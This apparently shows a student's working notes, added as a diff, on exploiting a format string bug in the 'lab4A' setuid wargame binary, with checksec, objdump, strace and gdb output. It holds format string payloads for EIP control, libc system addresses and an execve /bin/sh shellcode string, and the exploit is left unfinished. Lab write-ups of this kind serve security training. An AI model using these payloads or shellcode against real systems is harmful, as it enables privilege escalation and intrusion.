@@ -1,0 +1,194 @@
+Lab4A
+
+File:
+lab4A@warzone:/tmp$ file /levels/lab04/./lab4A
+/levels/lab04/./lab4A: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=db1ada30730a46f42d32c234793af5b2a5742ea5, not stripped
+
+gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : FULL
+
+
+lab4A@warzone:/tmp$ objdump -h -j .fini_array /levels/lab04/./lab4A
+
+/levels/lab04/./lab4A:     file format elf32-i386
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+ 18 .fini_array   00000004  08049eac  08049eac  00000eac  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+lab4A@warzone:/tmp$
+
+============================================================================================
+
+Program Logic - Analyze Vulnerability
+
+============================================================================================
+void log_wrapper(FILE *logf, char *msg, char *filename)
+{
+    char log_buf[255];
+    strcpy(log_buf, msg);
+    snprintf(log_buf+strlen(log_buf), 255-strlen(log_buf)-1/*NULL*/, filename);
+    log_buf[strcspn(log_buf, "\n")] = '\0';
+    fprintf(logf, "LOG: %s\n", log_buf);
+}
+
+
+1. log_wrapper() takes in a FILE pointer, a char. message, and a filename.
+2. load msg into log_buf[255];
+	- No length check
+3. snprintf() takes up to 4 args.        
+    - int snprintf(char *str, size_t size, const char *format, ...)
+	- The character format ISNT specified, [...] = filename
+4. strcspn() takes string length - the rejects = strlen(n)
+5. fprintf() write output to FILE *logf stream.
+
+
+main()
+
+1. usage instructions.
+2. Open log file "./backups/.log"
+3. initiate log_wrapper(), passing 3 values:
+
+	log_wrapper(FILE *logf, char *msg, char *filename)
+	- FILE stream pointer for "./backups/.log"
+	- message 
+	- filename
+4. open user file
+5. Copy BACKUP_DIR to dest_buf
+6. concatenate safely dest_buf, and filename, max 100 bytes.
+7. Open dest_buf[100] with RWX
+8. if target < 0, failed to open BACKUP_DIR, argv[1]
+9. while loop, it copies by characters and writes it to &ch
+
+============================================================================================
+
+EIP Control
+
+============================================================================================
+
+Filename is vulnerable to format string exploitation. Overwrite EIP.
+
+lab4A@warzone:/tmp$ strace /levels/lab04/./lab4A $(python -c 'print "ABBBB" + "%x" * 13 + "%n"'
+)
+execve("/levels/lab04/./lab4A", ["/levels/lab04/./lab4A", "ABBBB%x%x%x%x%x%x%x%x%x%x%x%x%x%"...], [/* 22 vars */]) = 0
+brk(0)                                  = 0x804b000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd9000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=30344, ...}) = 0
+mmap2(NULL, 30344, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd1000
+close(3)                                = 0
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\233\1\0004\0\0\0"..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1754876, ...}) = 0
+mmap2(NULL, 1759868, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e23000
+mmap2(0xb7fcb000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a8000) = 0xb7fcb000
+mmap2(0xb7fce000, 10876, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fce000
+close(3)                                = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e22000
+set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e22940, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+mprotect(0xb7fcb000, 8192, PROT_READ)   = 0
+mprotect(0x8049000, 4096, PROT_READ)    = 0
+mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
+munmap(0xb7fd1000, 30344)               = 0
+brk(0)                                  = 0x804b000
+brk(0x806c000)                          = 0x806c000
+open("./backups/.log", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
++++ killed by SIGSEGV (core dumped) +++
+Segmentation fault (core dumped)
+
+
+Find an address that can be overwritten.
+Use that overwrite to control program flow.
+
+ - .init_array: No because RELRO must be disabled
+ - GOT: No because FULL RELRO maps the GOT as Read-Only
+ - int target = -1:  
+
+ 
+
+
+============================================================================================
+
+
+ret2fini_array
+
+
+============================================================================================
+overwrite .init_array or .fini_array & redirect to libc_system()
+overwrite .init_array or .fini_array & redirect to shellcode
+
+$2 = {<text variable, no debug info>} 0xb7e63190 <__libc_system>
+gdb-peda$ p execve
+$3 = {<text variable, no debug info>} 0xb7ed8be0 <__execve>
+
+gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : FULL		<-- Not possible because of RELRO?
+
+-------------------------------------------------------------------
+lab4A@warzone:/tmp$ objdump -h -j .fini_array /levels/lab04/./lab4A
+
+/levels/lab04/./lab4A:     file format elf32-i386
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+ 18 .fini_array   00000004  08049eac  08049eac  00000eac  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+
+
+# objdump -h -j .init_array ./lab4A
+
+./lab4A:     file format elf32-i386
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+ 17 .init_array   00000004  08049ea8  08049ea8  00000ea8  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+---------------------------------------------------------------
+$(python -c 'print "A" + "BBBB" + "%x" * 12 + "%x%n"')
+
+
+
+============================================================================================
+
+
+ret2shellcode
+
+
+============================================================================================
+
+gdb-peda$ r $(python -c 'print "A" + "\x0c\xf6\xff\xbf" + "C" * 36 + "%x" * 12 + "%x%n"')
+
+[-------------------------------------code-------------------------------------]
+   0x80489d7 <log_wrapper+218>: add    esp,0x134
+   0x80489dd <log_wrapper+224>: pop    ebx
+   0x80489de <log_wrapper+225>: pop    ebp
+=> 0x80489df <log_wrapper+226>: ret
+   0x80489e0 <main>:    push   ebp
+   0x80489e1 <main+1>:  mov    ebp,esp
+   0x80489e3 <main+3>:  and    esp,0xfffffff0
+   0x80489e6 <main+6>:  sub    esp,0x90
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff64c --> 0x8048a8b (<main+171>:     mov    eax,DWORD PTR [esp+0xc])
+[...]
+
+0xbffff64c = Top the the stack, overwrite is possible.
+
+@ [mapped] : 0xb7fd801c ('C' <repeats 33 times>
+@ [stack]  : 0xbffff893 ('C' <repeats 33 times>
+shellcode = \x31\xc0\x83\xec\x04\x89\x04\x24\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+
+buf = 0xbffff50f
+
+============================================================================================
